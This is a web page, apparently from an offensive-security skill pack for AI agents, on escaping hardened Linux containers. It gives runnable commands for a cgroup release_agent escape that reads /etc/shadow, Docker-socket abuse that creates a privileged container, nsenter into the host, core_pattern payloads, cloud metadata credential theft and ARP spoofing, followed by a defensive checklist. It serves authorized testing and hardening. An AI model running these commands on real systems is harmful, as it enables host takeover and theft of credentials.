@@ -1,0 +1,277 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>escaping-hardened-containers — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / escaping-hardened-containers</div>
+  <h1 class="sk">escaping-hardened-containers</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
+  </div>
+  <p class="sdesc">Escape containers that drop capabilities, enforce seccomp profiles, and run behind AppArmor or SELinux — enumerating residual capabilities, analyzing seccomp filters, abusing single-capability escapes, cgroup release agents, filesystem mounts, and runtime CVEs. Use when a container has no --privileged flag but retains exploitable capabilities, when seccomp or LSM blocks standard escape paths, when targeting gVisor or Kata sandboxes, or when reviewing a hardened container deployment for residual attack surface.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><p>Most container escapes documented online assume <code>--privileged</code>. The work starts when the container IS hardened -- seccomp is on, capabilities are dropped, and the obvious paths are blocked. The remaining attack surface is smaller but not zero, and single capabilities or filesystem mounts are often enough.</p>
+<p>Only against systems you are authorized to test.</p>
+<h2>When to Use</h2>
+<ul>
+<li>The container is not privileged but retains one or more interesting capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH, CAP_NET_RAW)</li>
+<li>A seccomp profile is active and blocks common escape syscalls -- you need to map what is still allowed</li>
+<li>AppArmor or SELinux enforcement is present and you need to identify profile gaps</li>
+<li>The target runs under gVisor (runsc) or Kata Containers and you need sandbox-specific techniques</li>
+<li>You have identified a hostPath mount, host PID namespace, or mounted socket but the container is otherwise locked down</li>
+<li>A runtime CVE (runc, containerd, CRI-O) may apply despite hardening</li>
+</ul>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>Generic privileged container escapes and basic Kubernetes abuse</strong> -- use <a class="xref" href="exploiting-containers.html"><code>exploiting-containers</code></a></li>
+<li><strong>Managed Kubernetes cluster-level attacks (EKS, GKE, AKS)</strong> -- use <a class="xref" href="attacking-eks-gke-aks.html"><code>attacking-eks-gke-aks</code></a></li>
+<li><strong>Host-level privilege escalation after you have escaped</strong> -- use <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a></li>
+</ul>
+<h2>Capability Enumeration</h2>
+<p>Capabilities are the first thing to check. A single retained capability can be the entire escape.</p>
+<pre><code># Full capability dump
+capsh --print
+
+# From procfs when capsh is not installed
+grep Cap /proc/self/status
+# Decode the hex bitmask
+capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')
+
+# Quick check for the capabilities that matter most
+# CAP_SYS_ADMIN  - mount, unshare, bpf, cgroup writes
+# CAP_SYS_PTRACE - attach to host-namespace processes (with hostPID)
+# CAP_DAC_READ_SEARCH - open_by_handle_at, read any file
+# CAP_NET_RAW    - raw sockets, ARP spoofing, network pivoting
+# CAP_SYS_MODULE - load kernel modules (rare but instant root)
+# CAP_SYS_RAWIO  - iopl/ioperm, raw disk I/O</code></pre>
+<p><strong>CAP_DAC_READ_SEARCH -- the overlooked one.</strong> It grants <code>open_by_handle_at()</code>, which bypasses mount namespace isolation entirely. The <code>shocker</code> exploit uses this to read arbitrary files from the host filesystem by brute-forcing inode handles.</p>
+<pre><code># shocker PoC: reads /etc/shadow from the host
+# Requires: CAP_DAC_READ_SEARCH
+./shocker /etc/shadow</code></pre>
+<h2>Seccomp Profile Analysis</h2>
+<pre><code># Check if seccomp is enforced (2 = filter mode, 1 = strict, 0 = disabled)
+grep Seccomp /proc/self/status
+
+# Dump the active filter (requires kernel 4.4+ and CONFIG_SECCOMP_FILTER)
+cat /proc/self/seccomp_filter 2&gt;/dev/null
+
+# Use seccomp-tools to decompile the BPF filter
+seccomp-tools dump /proc/self/seccomp_filter</code></pre>
+<p><strong>Docker's default seccomp profile</strong> blocks ~44 syscalls. Key blocked calls include <code>mount</code>, <code>unshare</code>, <code>pivot_root</code>, <code>reboot</code>, <code>kexec_load</code>, and <code>init_module</code>. But it allows <code>ptrace</code>, <code>process_vm_readv</code>, and most socket operations.</p>
+<p><strong>Custom profiles are where mistakes live.</strong> Common gaps:</p>
+<ul>
+<li>Allowing <code>unshare</code> -- enables new namespace creation with CAP_SYS_ADMIN</li>
+<li>Allowing <code>mount</code> -- filesystem overlay attacks</li>
+<li>Allowing <code>bpf</code> -- eBPF programs can read kernel memory</li>
+<li>Allowing <code>userfaultfd</code> -- race condition exploitation primitive</li>
+<li>Allowing <code>keyctl</code> -- kernel keyring access, sometimes holds secrets</li>
+</ul>
+<pre><code># Test whether a specific syscall is available
+# If blocked, the process gets SIGKILL or EPERM
+python3 -c "import ctypes; ctypes.CDLL(None).syscall(272)"  # unshare = 272</code></pre>
+<h2>Namespace Escapes</h2>
+<h3>CAP_SYS_ADMIN + unshare</h3>
+<p>With CAP_SYS_ADMIN and <code>unshare</code> not blocked by seccomp, create a new user namespace and mount namespace to access the host filesystem.</p>
+<pre><code># Create new mount namespace and mount the host block device
+unshare -m /bin/sh -c 'mount /dev/sda1 /mnt &amp;&amp; ls /mnt'</code></pre>
+<h3>hostPID + CAP_SYS_PTRACE</h3>
+<p>When <code>hostPID: true</code> is set in the pod spec, <code>/proc</code> shows host processes. Combined with CAP_SYS_PTRACE, inject into a host process.</p>
+<pre><code># Find a root process on the host
+ps auxf | head -20
+
+# Attach and inject
+nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
+
+# Or via /proc/1/root -- the host root filesystem
+ls -la /proc/1/root/etc/shadow
+cat /proc/1/root/etc/shadow</code></pre>
+<h3>hostPID without CAP_SYS_PTRACE</h3>
+<p>Even without ptrace, hostPID leaks host process environment variables and command lines, which often contain secrets.</p>
+<pre><code>cat /proc/1/environ | tr '\0' '\n'
+for p in /proc/[0-9]*/cmdline; do cat "$p" | tr '\0' ' '; echo; done 2&gt;/dev/null | grep -i pass</code></pre>
+<h2>Cgroup Escapes</h2>
+<h3>Cgroup v1 release_agent</h3>
+<p>The classic escape for containers with CAP_SYS_ADMIN when cgroup v1 is in use. The release_agent runs on the host when the last process in a cgroup exits.</p>
+<pre><code># Find a writable cgroup mount
+mount | grep cgroup
+
+# Full escape sequence
+d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
+mkdir -p $d/w
+echo 1 &gt; $d/w/notify_on_release
+t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$t/cmd" &gt; $d/release_agent
+echo "#!/bin/sh" &gt; /cmd
+echo "cat /etc/shadow &gt; $t/output" &gt;&gt; /cmd
+chmod +x /cmd
+sh -c "echo 0 &gt; $d/w/cgroup.procs"
+sleep 1
+cat /output</code></pre>
+<h3>Cgroup v2 and Device Controller</h3>
+<p>Cgroup v2 removes <code>release_agent</code>. The remaining surface is eBPF-based device policy (requires <code>bpf()</code>) and writable device controllers:</p>
+<pre><code># If devices cgroup controller is writable
+echo 'a *:* rwm' &gt; /sys/fs/cgroup/devices/docker/&lt;id&gt;/devices.allow
+mknod /dev/sda b 8 0
+mount /dev/sda /mnt</code></pre>
+<h2>Filesystem-Based Escapes</h2>
+<h3>Mounted Docker Socket</h3>
+<pre><code># The most common misconfiguration even in "hardened" containers
+ls -la /var/run/docker.sock /run/docker.sock 2&gt;/dev/null
+
+# Without the docker CLI, use curl over the unix socket
+curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool
+
+# Create a privileged container that mounts the host root
+curl -s --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}' \
+  http://localhost/containers/create</code></pre>
+<h3>Host Filesystem Mounts</h3>
+<p>Any hostPath mount is a potential escape vector. Common ones:</p>
+<pre><code># Check all mount points
+mount | grep -vE 'proc|sys|cgroup|tmpfs'
+cat /proc/self/mountinfo
+
+# Writable host paths to look for:
+# /var/log         - write cron jobs via log injection
+# /var/run         - sockets (docker, containerd)
+# /etc             - write to crontab, shadow, authorized_keys
+# /var/lib/kubelet - kubelet credentials and config
+# /home            - SSH keys, shell configs</code></pre>
+<h3>/proc/sys/kernel/core_pattern</h3>
+<p>If <code>/proc/sys</code> is mounted writable (or the host mount includes it):</p>
+<pre><code># core_pattern with pipe: kernel runs the specified program when a process
+# crashes, as root on the host
+echo '|/path/on/host/payload.sh' &gt; /proc/sys/kernel/core_pattern
+# Then crash a process to trigger it</code></pre>
+<h3>/proc/sysrq-trigger</h3>
+<p>If writable, triggers kernel functions (mostly DoS). <code>echo b</code> reboots, <code>echo c</code> crashes for memory dump.</p>
+<h2>Runtime-Specific Vulnerabilities</h2>
+<h3>runc CVEs</h3>
+<p><strong>CVE-2024-21626 (Leaky Vessels)</strong> -- A file descriptor leak in runc allows a container to access the host filesystem via <code>/proc/self/fd/</code> during container startup. Affects runc &lt; 1.1.12.</p>
+<pre><code># Detection: check runc version
+runc --version 2&gt;/dev/null
+# On the host: runc is typically at /usr/bin/runc or /usr/sbin/runc</code></pre>
+<p>The exploit involves setting a container's working directory to a leaked fd pointing to the host filesystem. Requires the ability to build or influence container images.</p>
+<p><strong>CVE-2019-5736</strong> -- Overwrite the host runc binary by exploiting <code>/proc/self/exe</code> when runc joins the container namespace. Requires exec into the container (e.g., <code>docker exec</code>).</p>
+<h3>containerd / CRI-O</h3>
+<p><strong>CVE-2022-23648 (containerd)</strong> -- Read arbitrary host files via image config <code>VOLUME</code> directives referencing host paths.</p>
+<p><strong>CVE-2022-0811 (CRI-O, cr8escape)</strong> -- Kernel parameter injection via <code>--infra-ctr-cpuset</code> leading to host code execution. Check runtime version: <code>crictl version 2&amp;gt;/dev/null</code>.</p>
+<h2>Sandbox Bypass</h2>
+<h3>gVisor (runsc)</h3>
+<p>gVisor interposes a user-space kernel (the Sentry) between the container and the host kernel. The attack surface is different:</p>
+<ul>
+<li>The Sentry implements a subset of Linux syscalls. Unsupported syscalls</li>
+</ul>
+<p>fail, but the ones it does support may have implementation bugs.</p>
+<ul>
+<li>No direct kernel interaction means traditional kernel exploits do not</li>
+</ul>
+<p>work.</p>
+<ul>
+<li>File operations go through the Gofer process, which has limited host</li>
+</ul>
+<p>access.</p>
+<ul>
+<li>Focus on: Sentry bugs, network-facing vulnerabilities in the Sentry's</li>
+</ul>
+<p>TCP/IP stack, and escaping to the Gofer process.</p>
+<pre><code># Detect gVisor
+dmesg 2&gt;/dev/null | head -5  # gVisor has distinctive boot messages
+uname -r  # gVisor reports its own version string
+cat /proc/version  # look for "gVisor" or "runsc"</code></pre>
+<h3>Kata Containers</h3>
+<p>Kata runs each container in a lightweight VM. The threat model is fundamentally different:</p>
+<ul>
+<li>Container-to-host escapes require a VM escape (QEMU/Cloud Hypervisor</li>
+</ul>
+<p>vulnerability).</p>
+<ul>
+<li>The attack surface is the hypervisor, virtio devices, and the Kata</li>
+</ul>
+<p>agent inside the VM.</p>
+<ul>
+<li>Guest-to-host file sharing (virtio-fs / 9pfs) is the most likely</li>
+</ul>
+<p>weakness.</p>
+<ul>
+<li>Host network namespace sharing, if configured, exposes the host network.</li>
+</ul>
+<h2>Container-to-Host Network Attacks</h2>
+<h3>Host Network Namespace</h3>
+<p>When <code>hostNetwork: true</code> is set, the container shares the host's network stack entirely.</p>
+<pre><code>ip addr   # host interfaces, not veth pairs
+ss -tlnp  # host listening services -- look for kubelet (10250), etcd (2379)</code></pre>
+<h3>Metadata Service Access</h3>
+<p>Cloud metadata endpoints (169.254.169.254) are reachable independent of container hardening. Network policies are the only mitigation.</p>
+<pre><code>curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/          # AWS
+curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/    # GCP
+curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure</code></pre>
+<h3>ARP Spoofing from CAP_NET_RAW</h3>
+<p>With CAP_NET_RAW, ARP spoof to intercept pod-to-pod or pod-to-gateway traffic: <code>arpspoof -i eth0 -t &amp;lt;target_ip&amp;gt; &amp;lt;gateway_ip&amp;gt;</code>.</p>
+<h2>Defensive Review Checklist</h2>
+<p>When reviewing a hardened container deployment, verify:</p>
+<ol>
+<li><strong>Capabilities</strong> -- only the minimum set is granted; CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH are absent</li>
+<li><strong>Seccomp</strong> -- a custom profile is applied (not just the Docker default); <code>unshare</code>, <code>mount</code>, <code>bpf</code>, <code>userfaultfd</code> are blocked</li>
+<li><strong>LSM</strong> -- AppArmor or SELinux profile is loaded and enforcing, not just present</li>
+<li><strong>Namespaces</strong> -- hostPID, hostNetwork, hostIPC are all false</li>
+<li><strong>Filesystem</strong> -- no hostPath mounts; Docker socket is not mounted; /proc/sys is read-only</li>
+<li><strong>Runtime</strong> -- runc, containerd, and CRI-O are patched for known CVEs</li>
+<li><strong>Network</strong> -- NetworkPolicy denies metadata service access (169.254.169.254); inter-pod traffic is segmented</li>
+<li><strong>Read-only root</strong> -- <code>readOnlyRootFilesystem: true</code> is set; writable paths are tmpfs with noexec</li>
+</ol>
+<h2>Rationalizations to Reject</h2>
+<ul>
+<li><em>"We dropped all capabilities."</em> Check the effective set, not the config. Kubernetes adds some back by default, and init containers or sidecars may differ from the main container.</li>
+<li><em>"Seccomp is enabled."</em> The Docker default profile still allows ptrace, most socket operations, and process_vm_readv. A custom profile tuned to the application is required.</li>
+<li><em>"We run gVisor, so container escapes don't apply."</em> gVisor reduces the kernel attack surface but introduces its own: Sentry bugs, Gofer escapes, and an incomplete syscall surface that may fail open in edge cases.</li>
+<li><em>"There are no hostPath mounts."</em> Check for mounted secrets directories, service account tokens with excessive permissions, and emptyDir volumes shared between containers with different privilege levels.</li>
+<li><em>"The runtime is patched."</em> Patch status is a point in time. CVE-2024-21626 affected runc for years before disclosure. Confirm the exact version, do not trust "we keep it updated."</li>
+<li><em>"AppArmor is enforcing."</em> Read the actual profile. Many deployments use <code>runtime/default</code> or <code>unconfined</code>. A profile that exists but permits <code>mount</code>, <code>ptrace</code>, and raw network access is enforcing nothing useful.</li>
+<li><em>"The container only has CAP_NET_RAW, that's harmless."</em> CAP_NET_RAW enables ARP spoofing, DNS poisoning between pods, and raw socket access to the metadata service. It is not harmless.</li>
+</ul>
+<h2>ATT&amp;CK Coverage</h2>
+<p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
+<p><strong>Privilege Escalation</strong> (TA0004)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1611/">T1611</a> Escape to Host — see also <a class="xref" href="exploiting-containers.html"><code>exploiting-containers</code></a></li>
+</ul>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
+<h2>References</h2>
+<ul>
+<li><a class="xref" href="exploiting-containers.html"><code>exploiting-containers</code></a> -- baseline container escape and Kubernetes abuse techniques</li>
+<li><a class="xref" href="attacking-eks-gke-aks.html"><code>attacking-eks-gke-aks</code></a> -- managed Kubernetes cluster-level attacks</li>
+<li><a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a> -- host-level privilege escalation after escaping</li>
+<li><a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a> -- building detection rules for container escape indicators</li>
+</ul></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
